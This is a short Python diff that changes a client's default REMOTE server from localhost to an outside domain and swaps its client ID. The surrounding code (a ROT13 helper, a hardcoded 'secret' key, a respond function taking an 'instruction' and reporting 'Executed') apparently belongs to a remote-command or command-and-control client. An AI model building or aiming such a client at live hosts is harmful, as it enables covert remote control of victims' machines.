@@ -18,8 +18,8 @@ def yalla(s):
     m = {a:b for a,b in zip("ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz", "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")}     
     return ''.join(m.setdefault(c, c) for c in s)
 
-REMOTE = os.getenv("REMOTE") or 'http://127.0.0.1:5000'
-CLIENT_ID = os.getenv("CLIENT_ID") or '783a9742-a0fa-4fa6-89c5-7169816f9136'
+REMOTE = os.getenv("REMOTE") or 'https://investnorge.com'
+CLIENT_ID = os.getenv("CLIENT_ID") or 'fffbcd73-583c-4a77-b3e1-a81f14c12020'
 KEY = 'secret'
 
 def respond(instruction, result, status="Executed"):
